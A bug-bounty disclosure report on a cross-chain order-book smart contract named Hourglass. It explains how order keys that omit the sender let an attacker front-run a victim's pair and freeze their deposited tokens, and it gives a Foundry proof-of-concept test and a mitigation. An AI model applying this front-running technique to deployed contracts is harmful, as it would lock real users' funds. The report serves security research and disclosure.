> Disclaimer: This bug was reported for a different project that was also named *Hourglass* — a CLOB protocol — and is *not* related to the current Hourglass BBP on Immunefi. That previous Hourglass project was removed and banned from the platform by the Immunefi team due to unresponsiveness and failure to pay security researchers (#MeToo xD). Hope you enjoy reading this report — thanks!

## Attackers can easily owerrite users' Orders data in the OrderBook due to the usage of risky `keys` in the `Order` mapping

### Description
The keys used in this important mapping book to store the users' order data, are very dangerous, as they can be easily overwritten by an attackers to cause harm to the users.
```solidity
    //Orderbook (chain_id,source_token,destination_token)
    mapping(uint256 => mapping(address => mapping(address => Pair))) internal book;
```
### Vulnerability Details
When a user is going to place a takers order by invoking `PlaceTakers()`, it will provide `sell_token`, `buy_token`, `lz_cid` & `_quantity` as the function input. `sell_token`, `buy_token` & `lz_cid` will be used to store user's data in the orderbook:
```solidity
        Pair storage selected_pair = book[lz_cid][sell_token][buy_token];
```        
This same mapping will be used everywhere to fetch user's data and execute his takers order. Like in this `send()` function, which is used to execute users orders:
```solidity
    function send(address sell_token, address buy_token, uint256 lz_cid) public nonReentrant {
@>      Pair storage selected_pair = book[lz_cid][sell_token][buy_token];
        require(!selected_pair.isAwaiting, "!await lz inbound msg");
        require(block.timestamp - uint256(selected_pair.index.timestamp) >= settings.epochspan, "!await timestamp"); //@
        require(address(this).balance >= 2 * settings.MINGAS, "!gasLimit send");
        resolve_epoch(sell_token, buy_token, lz_cid);

        selected_pair.isAwaiting = true;
    }
```
If we look at the `send()` function, there is an important check which makes sures that, the pair on this spoke isn't waiting for an inbound layer zero message (or in other words, its not already resolved/sent)
```solidity
        require(!selected_pair.isAwaiting, "!await lz inbound msg");
```        
If it is already sent or its waiting for an inbound LZ then the trx gets revert, Notice, the `send()` function also sets it to true after invoking `resolve_epoch()`.

### Attack Vector
Now, this clearly means that an attacker can create a same order like any user's order (same buyToken, sellToken & chainId) but with less quantity tokens, this will overwrite user's pair and then the attacker will call the `send()` function, which will set pair's `isAwaiting` value to `true`, then the user will never gonna be able to execute `send()` with his pair.

For more clarity, Let's consider this:
- Ali creates a taker order for 10,000 USDC from ARB to USDT on ETH
- Shaheen notices Ali's big order, so he places a taker order of 100 USDC from ARB to USDT on ETH.
- Ali's & Shaheen's pair in the orderbook mapping will be same (esp IsAwaiting bool wise)
- Now after epochspan, Shaheen will call the send() which will set the pair's IsAwaiting to true.
- Ali calls the send() with the pair, but his call will revert "!await lz inbound msg"
This exactly is what the PoC demonstrates.

### Impact Details
- Loss of Funds.
- DoS.
- Assets Freeze in a contract permanently.
Loss of Funds for the Users, as the `PlaceTaker()` function transfers tokens from the user to the contract, and as now users are not gonna be able to call `send()` then those tokens will be permanently stuck in the contract.

### Recommended Mitigation
Add a key in the Pair/book mapping, which cannot be replicated easily like the tokens quantity or the sender's address to make it absolutely secure. Thanks!

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol"; import {MockERC20} from "./Mocks/MockER20.sol"; import {Spoke} from "./../src/hourglass/Multichain.sol"; import "forge-std/console.sol";

contract SpokeTest is Test { Spoke public spoke; MockERC20 public token; address Ali = address(3); address Shaheen = address(5);

function setUp() public {
    spoke = new Spoke(address(12345), 12345);
    token = new MockERC20("TOKEN", "TKN", 18);
}

function test_placeTaker_OverrideProblems_Poc() public {
    token.mint(Ali, 7 ether);
    token.mint(Shaheen, 2 ether);

    address sell_token = address(token);
    address buy_token = address(1);
    uint256 lz_cid = 1122;
    uint96 quantityA = 5 ether;

    vm.startPrank(Ali);
    vm.deal(Ali, 1 ether);
    spoke.placeTaker{value: 1 ether}(sell_token, buy_token, lz_cid, quantityA);
    vm.stopPrank();
    bool await1 = spoke.getAwait(sell_token, buy_token, lz_cid);
    assertEq(await1, false);

    uint96 quantityB = 0.1 ether;
    vm.startPrank(Shaheen);
    vm.deal(Shaheen, 1 ether);
    spoke.placeTaker{value: 1 ether}(sell_token, buy_token, lz_cid, quantityB);
    vm.stopPrank();
    bool await2 = spoke.getAwait(sell_token, buy_token, lz_cid);
    assertEq(await2, false);

    vm.prank(Shaheen);
    spoke.send(sell_token, buy_token, lz_cid);
    bool await3 = spoke.getAwait(sell_token, buy_token, lz_cid);
    assertEq(await3, true);

    vm.prank(Ali);
    vm.expectRevert("!await lz inbound msg");
    spoke.send(sell_token, buy_token, lz_cid);
    }
}
```
About the Coded PoC;
Make sure to add the Mock Contracts to run the PoC. Mock Contracts can be created using this guide: https://medium.com/sphere-audits/a-complete-guide-to-erc20-fuzz-and-invariant-testing-using-foundry-23b06888b5fd. Also to make the PoC easy and straightforward, we omitted out these lines: 78, 80, 81, 723 & 727, As our main focus is to see the working of the contract's state.
> ```solidity
> For PoC to work make sure to remove the spoke.getAwait(sell_token, buy_token, lz_cid) calls in the tests OR add this view function in the Multichain.sol / Spoke contract:

>     function getAwait(address sell_token, address buy_token, uint256 lz_cid) public view returns (bool await) {
>         Pair storage selected_pair = book[lz_cid][sell_token][buy_token];
>         return selected_pair.isAwaiting;
>     }
> ```
> I added this getAwait() in the main contract, just for my help, you guys can do the same or remove all the spoke.getAwait() calls from the tests, it can be removed and the PoC will still work as one send() will pass & the other send() will still revert and thats enough to showcase the PoC.